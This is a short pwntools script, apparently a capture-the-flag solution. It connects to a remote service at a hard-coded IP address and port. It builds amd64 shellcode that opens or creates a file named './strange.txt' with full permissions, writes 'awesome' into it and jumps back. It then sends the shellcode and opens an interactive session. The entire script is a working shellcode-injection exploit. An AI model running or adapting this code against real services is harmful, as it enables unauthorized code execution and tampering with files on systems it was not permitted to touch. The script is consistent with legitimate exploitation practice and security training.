from pwn import *

p = remote("157.245.88.100", 7779)

context.bits = 64
context.arch = "amd64"

code = asm(
  "pop r13"
  + shellcraft.open("./strange.txt", 'O_RDWR|O_CREAT|O_TRUNC', 'S_IRWXU|S_IRWXG|S_IRWXO')
  + "mov r12, rax"
  + shellcraft.echo("awesome\n", 'r12')
  + "\njmp r13"
)

p.send(code)

p.interactive()
